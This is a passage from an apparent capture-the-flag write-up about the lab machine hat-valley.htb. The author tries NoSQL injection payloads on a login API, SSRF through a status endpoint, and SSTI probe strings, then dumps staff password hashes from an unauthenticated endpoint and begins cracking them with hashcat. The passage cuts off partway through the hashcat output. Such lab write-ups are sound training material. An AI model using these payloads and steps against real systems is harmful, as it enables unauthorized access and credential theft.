        <span data-label-text="JavaScript"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">JsonWebTokenError</span><span class="p">:</span> <span class="nx">jwt</span> <span class="nx">malformed</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nb">Object</span><span class="p">.</span><span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="p">[</span><span class="k">as</span> <span class="nx">verify</span><span class="p">]</span> <span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">jsonwebtoken</span><span class="o">/</span><span class="nx">verify</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">63</span><span class="p">:</span><span class="mi">17</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">server</span><span class="o">/</span><span class="nx">server</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">62</span><span class="p">:</span><span class="mi">30</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="k">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">layer</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nf">next </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">route</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">144</span><span class="p">:</span><span class="mi">13</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nx">Route</span><span class="p">.</span><span class="nf">dispatch </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">route</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">114</span><span class="p">:</span><span class="mi">3</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nx">Layer</span><span class="p">.</span><span class="nx">handle</span> <span class="p">[</span><span class="k">as</span> <span class="nx">handle_request</span><span class="p">]</span> <span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">layer</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">95</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="o">/</span><span class="kd">var</span><span class="sr">/www/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">284</span><span class="p">:</span><span class="mi">15</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nb">Function</span><span class="p">.</span><span class="nf">process_params </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">346</span><span class="p">:</span><span class="mi">12</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nf">next </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">express</span><span class="o">/</span><span class="nx">lib</span><span class="o">/</span><span class="nx">router</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">280</span><span class="p">:</span><span class="mi">10</span><span class="p">)</span><span class="o">&lt;</span><span class="nx">br</span><span class="o">&gt;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">nbsp</span><span class="p">;</span><span class="nx">at</span> <span class="nf">cookieParser </span><span class="p">(</span><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">hat</span><span class="o">-</span><span class="nx">valley</span><span class="p">.</span><span class="nx">htb</span><span class="o">/</span><span class="nx">node_modules</span><span class="o">/</span><span class="nx">cookie</span><span class="o">-</span><span class="nx">parser</span><span class="o">/</span><span class="nx">index</span><span class="p">.</span><span class="nx">js</span><span class="p">:</span><span class="mi">71</span><span class="p">:</span><span class="mi">5</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

<p>My cookie was invalid. It was expecting a JWT. I tried forging one with the <code class="language-plaintext highlighter-rouge">none</code> algorithm. Especially since I know about a <a href="https://security.snyk.io/vuln/SNYK-JS-JSONWEBTOKEN-3180026">recent vulnerability</a> in the library it used. But that failed.</p>

<p>The login attempts were posted to <code class="language-plaintext highlighter-rouge">/api/login</code>.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">hat-valley.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">39</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://hat-valley.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://hat-valley.htb/hr</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">token=guest</span>

<span class="p">{</span><span class="nl">"username"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">,</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"admin"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>I tried sending some SQL injections without any results.</p>

<p>I tried NoSQL injection in the username.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">hat-valley.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">40</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://hat-valley.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://hat-valley.htb/hr</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">token=guest</span>

<span class="p">{</span><span class="nl">"username"</span><span class="p">:{</span><span class="w">
</span><span class="nl">"$ne"</span><span class="p">:</span><span class="s2">""</span><span class="p">},</span><span class="nl">"password"</span><span class="p">:</span><span class="s2">"'"</span><span class="p">}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">401</span> <span class="ne">Unauthorized</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 13 Jan 2023 14:47:05 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">30</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">x-powered-by</span><span class="p">:</span> <span class="s">Express</span>
<span class="na">access-control-allow-origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">etag</span><span class="p">:</span> <span class="s">W/"1e-rLNS954LHEEL+kNUFi+s5vEu3/o"</span>

Incorrect username or password
</pre></td></tr></tbody></table></code></div></div>

<p>It didn‚Äôt do anything. I tried in the password.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre></td><td class="rouge-code"><pre><span class="nf">POST</span> <span class="nn">/api/login</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">hat-valley.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">49</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://hat-valley.htb</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://hat-valley.htb/hr</span>
<span class="na">Cookie</span><span class="p">:</span> <span class="s">token=guest</span>

<span class="p">{</span><span class="nl">"username"</span><span class="p">:{</span><span class="w">
</span><span class="nl">"$ne"</span><span class="p">:</span><span class="s2">""</span><span class="p">},</span><span class="nl">"password"</span><span class="p">:{</span><span class="w">
</span><span class="nl">"$ne"</span><span class="p">:</span><span class="s2">""</span><span class="p">}}</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>It gave me an error. But it did not appear to be used in a database query. It was probably trying to hash the password to validate it. But that hinted that the types of the data were not checked.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">500</span> <span class="ne">Internal Server Error</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Fri, 13 Jan 2023 14:47:21 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">text/html; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">1247</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">x-powered-by</span><span class="p">:</span> <span class="s">Express</span>
<span class="na">access-control-allow-origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">content-security-policy</span><span class="p">:</span> <span class="s">default-src 'none'</span>
<span class="na">x-content-type-options</span><span class="p">:</span> <span class="s">nosniff</span>

<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
<span class="nt">&lt;head&gt;</span>
<span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;title&gt;</span>Error<span class="nt">&lt;/title&gt;</span>
<span class="nt">&lt;/head&gt;</span>
<span class="nt">&lt;body&gt;</span>
<span class="nt">&lt;pre&gt;</span>TypeError [ERR_INVALID_ARG_TYPE]: The first argument must be of type string or an instance of Buffer, ArrayBuffer, or Array or an Array-like Object. Received an instance of Object<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at Function.from (buffer.js:330:9)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at new Buffer (buffer.js:286:17)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at module.exports (/var/www/hat-valley.htb/node_modules/sha256/lib/nodecrypto.js:14:12)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at /var/www/hat-valley.htb/server/server.js:30:76<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at next (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:144:13)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at Route.dispatch (/var/www/hat-valley.htb/node_modules/express/lib/router/route.js:114:3)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at Layer.handle [as handle_request] (/var/www/hat-valley.htb/node_modules/express/lib/router/layer.js:95:5)<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at /var/www/hat-valley.htb/node_modules/express/lib/router/index.js:284:15<span class="nt">&lt;br&gt;</span> <span class="ni">&amp;nbsp;</span> <span class="ni">&amp;nbsp;</span>at Function.process_params (/var/www/hat-valley.htb/node_modules/express/lib/router/index.js:346:12)<span class="nt">&lt;/pre&gt;</span>
<span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>
</pre></td></tr></tbody></table></code></div></div>

<h3 id="apis"><span class="mr-2">APIs</span><a href="#apis" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I looked at the various API calls the application was making. I looked in the services folder in the application code.</p>

<ul>
  <li>/api/all-leave - Get the leave requests</li>
  <li>/api/submit-leave - Create a leave request</li>
  <li>/api/login - Login to the application</li>
  <li>/api/staff-details - Get information about the staff</li>
  <li>/api/store-status - Verify if the store is online</li>
</ul>

<p>Most the calls were failing because of my bad JWT. I tried forging one again, but I failed.</p>

<h3 id="server-side-request-forgery-ssrf"><span class="mr-2">Server-Side Request Forgery (SSRF)</span><a href="#server-side-request-forgery-ssrf" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The store status API calls were not failing with my token. It was always returning a 200 with no content. I removed the token and got the same result.</p>

<p>The API was taking a URL parameter. So I immediately thought I could get SSRF. I tried changing the URL to see what would happen. I sent ‚Äòhttp://hat-valley.htb‚Äô, this time the response contained the main site source code. I tried requesting other pages, but got blank responses. Requesting a JavaScript file worked. It looked like anything that required authentication failed. But still responded with a 200.</p>

<p>I tried setting up a web server on my machine. I could use the status call to request it. I tried using redirects. It worked, but I got the same results as requesting the pages directly in the URL parameter.</p>

<p>I also tried sending a page with multiple Server-Side Templating (SSTI) payloads taken from <a href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#detect">HackTricks</a>. None of them worked.</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre></td><td class="rouge-code"><pre>{{7*7}}
${7*7}
&lt;%= 7*7 %&gt;
${{7*7}}
#{7*7}
*{7*7}
engine.render("Hello {{"+greeting+"}}", data)
</pre></td></tr></tbody></table></code></div></div>

<p>I thought that maybe there were other ports accessible only on the server. I scanned the ports again, this time with nmap, to see if it would detect any filtered port. It did not.</p>

<h3 id="unauthenticated-api-call"><span class="mr-2">Unauthenticated API Call</span><a href="#unauthenticated-api-call" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>I was going to write a small script to try requesting all the ports with the SSRF. But I decided to first add more notes on the different API calls. The fact that the status call was working without the token made me think that they were not all using the same code. And maybe some calls were not correctly protected.</p>

<p>I went through all the API endpoints. I tried with my ‚Äòadmin‚Äô token, with a generated unsigned token, and without any token.</p>

<p>When I got to the staff details endpoint, I got a nice surprise when I requested it without a token.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre></td><td class="rouge-code"><pre><span class="nf">GET</span> <span class="nn">/api/staff-details</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">hat-valley.htb</span>
<span class="na">User-Agent</span><span class="p">:</span> <span class="s">Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span>
<span class="na">Accept</span><span class="p">:</span> <span class="s">application/json, text/plain, */*</span>
<span class="na">Accept-Language</span><span class="p">:</span> <span class="s">en-US,en;q=0.5</span>
<span class="na">Accept-Encoding</span><span class="p">:</span> <span class="s">gzip, deflate</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">Referer</span><span class="p">:</span> <span class="s">http://hat-valley.htb/dashboard</span>
</pre></td></tr></tbody></table></code></div></div>

<p>It worked without the JWT.</p>

<div class="language-http highlighter-rouge"><div class="code-header">
        <span data-label-text="Http"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
</pre></td><td class="rouge-code"><pre><span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span> <span class="m">200</span> <span class="ne">OK</span>
<span class="na">Server</span><span class="p">:</span> <span class="s">nginx/1.18.0 (Ubuntu)</span>
<span class="na">Date</span><span class="p">:</span> <span class="s">Sun, 15 Jan 2023 12:10:29 GMT</span>
<span class="na">Content-Type</span><span class="p">:</span> <span class="s">application/json; charset=utf-8</span>
<span class="na">Content-Length</span><span class="p">:</span> <span class="s">775</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">close</span>
<span class="na">x-powered-by</span><span class="p">:</span> <span class="s">Express</span>
<span class="na">access-control-allow-origin</span><span class="p">:</span> <span class="s">*</span>
<span class="na">etag</span><span class="p">:</span> <span class="s">W/"307-yT9RDkJOX+lsRRlC/J2nEu9d6Is"</span>

<span class="p">[</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"user_id"</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"christine.wool"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"6529fc6e43f9061ff4eaa806b087b13747fbe8ae0abfd396a5c4cb97c5941649"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"fullname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Christine Wool"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Founder, CEO"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0415202922"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"user_id"</span><span class="p">:</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"christopher.jones"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"e59ae67897757d1a138a46c1f501ce94321e96aa7ec4445e0e97e94f2ec6c8e1"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"fullname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Christopher Jones"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Salesperson"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0456980001"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"user_id"</span><span class="p">:</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"jackson.lightheart"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"b091bc790fe647a0d7e8fb8ed9c4c01e15c77920a42ccd0deaca431a44ea0436"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"fullname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Jackson Lightheart"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Salesperson"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0419444111"</span><span class="w">
  </span><span class="p">},</span><span class="w">
  </span><span class="p">{</span><span class="w">
    </span><span class="nl">"user_id"</span><span class="p">:</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="w">
    </span><span class="nl">"username"</span><span class="p">:</span><span class="w"> </span><span class="s2">"bean.hill"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"password"</span><span class="p">:</span><span class="w"> </span><span class="s2">"37513684de081222aaded9b8391d541ae885ce3b55942b9ac6978ad6f6e1811f"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"fullname"</span><span class="p">:</span><span class="w"> </span><span class="s2">"Bean Hill"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"role"</span><span class="p">:</span><span class="w"> </span><span class="s2">"System Administrator"</span><span class="p">,</span><span class="w">
    </span><span class="nl">"phone"</span><span class="p">:</span><span class="w"> </span><span class="s2">"0432339177"</span><span class="w">
  </span><span class="p">}</span><span class="w">
</span><span class="p">]</span><span class="w">
</span></pre></td></tr></tbody></table></code></div></div>

<p>Even better, it returned the password hashes as part of the payload. I saved them to a file and tried cracking them with hashcat.</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
</pre></td><td class="rouge-code"><pre><span class="nv">$ </span>hashcat <span class="nt">-a0</span> <span class="nt">-m1400</span> <span class="nt">--username</span> hash.txt /usr/share/seclists/rockyou.txt
hashcat <span class="o">(</span>v6.2.6<span class="o">)</span> starting

OpenCL API <span class="o">(</span>OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG<span class="o">)</span> - Platform <span class="c">#1 [The pocl project]</span>
<span class="o">============================================================================================================================================</span>
<span class="k">*</span> Device <span class="c">#1: pthread-AMD Ryzen 7 PRO 5850U with Radeon Graphics, 2869/5803 MB (1024 MB allocatable), 6MCU</span>

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 4 digests<span class="p">;</span> 4 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
<span class="k">*</span> Zero-Byte
<span class="k">*</span> Early-Skip
